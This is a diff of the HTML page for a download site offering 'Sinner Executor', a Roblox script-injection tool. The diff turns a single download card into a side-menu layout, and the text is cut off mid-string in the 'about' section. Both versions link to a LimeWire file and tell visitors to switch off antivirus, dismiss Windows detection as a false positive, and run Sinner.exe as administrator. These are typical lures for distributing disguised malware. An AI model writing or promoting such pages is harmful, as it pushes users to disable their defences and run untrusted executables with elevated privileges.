@@ -3,169 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Page</title>
+    <title>Interactive Page with Side Menu</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: 'Courier New', Courier, monospace;
             color: #ffffff;
-            text-align: center;
             background-color: #000000;
-            background-image: url('https://cdn.discordapp.com/attachments/1318094227770576936/1322482772316655686/dithered-image.png?ex=67725b0f&is=6771098f&hm=6cd302376a847f043670cdeb2ac66d38a975731dea872adea3f317b27defae03&');
+            background-image: url('https://cdn.discordapp.com/attachments/1318094227770576936/1322482772316655686/dithered-image.png');
             background-size: auto;
             background-position: center;
             background-repeat: repeat;
         }
 
-        h1 {
+        .menu {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 250px;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.5);
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            overflow: auto;
+            z-index: 1000;
+        }
+
+        .menu.open {
+            transform: translateX(0);
+        }
+
+        .menu h2 {
+            color: red;
+            text-align: center;
+            margin: 10px 0;
+            text-shadow: 2px 2px 5px red;
+        }
+
+        .menu button {
+            width: 100%;
+            padding: 15px;
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 18px;
+            text-align: left;
+            cursor: pointer;
+            border-bottom: 1px solid #444;
+        }
+
+        .menu button:hover {
+            background-color: red;
+            color: black;
+        }
+
+        .menu-toggle {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: red;
+            border: none;
+            color: #ffffff;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+            z-index: 1100;
+        }
+
+        .content {
+            margin: 20px;
+            text-align: center;
+        }
+
+        .content h1 {
             font-size: 3em;
             margin-top: 20px;
             text-shadow: 2px 2px 5px red;
         }
 
-        .container {
-            text-align: center;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px red;
-            width: 90%;
-            max-width: 400px;
-            margin: auto;
-        }
-
-        .container h1 {
-            font-size: 26px;
-            color: #ffffff;
-            margin-bottom: 15px;
-        }
-
-        .container p {
-            font-size: 16px;
-            color: #cccccc;
-            margin: 10px 0 20px;
+        .content p {
+            font-size: 1.2em;
             line-height: 1.6;
-        }
-
-        .download-link {
-            display: inline-block;
-            background-color: red;
-            color: #ffffff;
-            text-decoration: none;
-            padding: 12px 25px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 5px;
-            box-shadow: 0px 0px 5px rgba(255, 0, 0, 0.8);
-            transition: background-color 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .download-link:hover {
-            background-color: darkred;
-            box-shadow: 0px 0px 10px rgba(255, 0, 0, 1);
-        }
-
-        .tips {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #bbbbbb;
-            text-align: left;
-        }
-
-        .tips ul {
-            list-style-type: square;
-            padding-left: 20px;
-        }
-
-        .tips li {
-            margin: 5px 0;
-        }
-
-        .eyes-container {
-            position: absolute;
-            top: 90%; /* Adjust the eyes to appear lower */
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            z-index: 10;
-        }
-
-        .eye {
-            position: relative;
-            width: 80px;
-            height: 80px;
-            background-color: white;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
-        }
-
-        .pupil {
-            position: absolute;
-            width: 30px;
-            height: 30px;
-            background-color: black;
-            border-radius: 50%;
         }
 
         footer {
             margin-top: 50px;
             font-size: 0.9em;
+            text-align: center;
+            color: #bbbbbb;
         }
     </style>
 </head>
 <body>
-    <h1>☠ Sinner Executor ☠</h1>
-    <div class="container">
-        <p>Windows might detect the file as a false positive, so you'll need to disable it temporarily. Then run the <strong>Sinner.exe</strong>. Once launched, a menu will appear. Simply attach it to Roblox and run any script you want.</p>
-        <a class="download-link" href="https://limewire.com/d/de666bb1-9f16-4a5e-b16c-edb19dd23f66#TCfxUqO-JOMvzlzmUkIg_vHvD1jO1P7OfCJzNWJqXa0" download>Download Sinner Executor</a>
-        <div class="tips">
-            <h2>Tips:</h2>
-            <ul>
-                <li>Ensure your antivirus is turned off before downloading.</li>
-                <li>Run the file as an administrator for optimal performance.</li>
-                <li>Double-check that you are attaching the tool to Roblox correctly.</li>
-            </ul>
-        </div>
+    <button class="menu-toggle">☰ Menu</button>
+    <div class="menu" id="menu">
+        <h2>Menu</h2>
+        <button onclick="showContent('home')">Home</button>
+        <button onclick="showContent('download')">Download</button>
+        <button onclick="showContent('tips')">Tips</button>
+        <button onclick="showContent('about')">About</button>
     </div>
-    <div class="eyes-container">
-        <div class="eye">
-            <div class="pupil" id="pupil1"></div>
-        </div>
-        <div class="eye">
-            <div class="pupil" id="pupil2"></div>
-        </div>
+
+    <div class="content" id="content">
+        <h1>Welcome!</h1>
+        <p>Use the menu to navigate through the page content.</p>
     </div>
+
     <footer>
-        ☠ UNC METER BELLOW ☠
+        ☠ UNC METER BELOW ☠
+        <meter value="76" min="0" max="100" low="30" high="70" optimum="80"></meter>
     </footer>
-UNC:86
+
     <script>
-        // Eyes that follow the mouse
-        const pupils = document.querySelectorAll('.pupil');
-        document.addEventListener('mousemove', (event) => {
-            const { clientX, clientY } = event;
-            pupils.forEach((pupil) => {
-                const rect = pupil.parentElement.getBoundingClientRect();
-                const centerX = rect.left + rect.width / 2;
-                const centerY = rect.top + rect.height / 2;
-                const deltaX = clientX - centerX;
-                const deltaY = clientY - centerY;
-                const distance = Math.min(15, Math.sqrt(deltaX ** 2 + deltaY ** 2));
-                const angle = Math.atan2(deltaY, deltaX);
+        const menu = document.getElementById('menu');
+        const menuToggle = document.querySelector('.menu-toggle');
+        const content = document.getElementById('content');
 
-                const pupilX = Math.cos(angle) * distance;
-                const pupilY = Math.sin(angle) * distance;
-
-                pupil.style.transform = `translate(${pupilX}px, ${pupilY}px)`;
-            });
+        menuToggle.addEventListener('click', () => {
+            menu.classList.toggle('open');
         });
-    </script>
-</body>
-</html>
-<meter value="76" min="0" max="100" low="30" high="70" optimum="80"></meter>
+
+        function showContent(section) {
+            let html = '';
+            switch (section) {
+                case 'home':
+                    html = `
+                        <h1>Welcome!</h1>
+                        <p>Use the menu to navigate through the page content.</p>
+                    `;
+                    break;
+                case 'download':
+                    html = `
+                        <h1>Download Page</h1>
+                        <p>Click below to download the Sinner Executor:</p>
+                        <a class="download-link" href="https://limewire.com/d/de666bb1-9f16-4a5e-b16c-edb19dd23f66" download>Download Sinner Executor</a>
+                    `;
+                    break;
+                case 'tips':
+                    html = `
+                        <h1>Tips</h1>
+                        <ul>
+                            <li>Ensure your antivirus is turned off before downloading.</li>
+                            <li>Run the file as an administrator for optimal performance.</li>
+                            <li>Double-check that you are attaching the tool to Roblox correctly.</li>
+                        </ul>
+                    `;
+                    break;
+                case 'about':
+                    html = `
+                        <h1>About Sinner Executor</h1>
+                        <p>Sinner Executor is a tool designed for Roblox enthusiasts to execute scripts
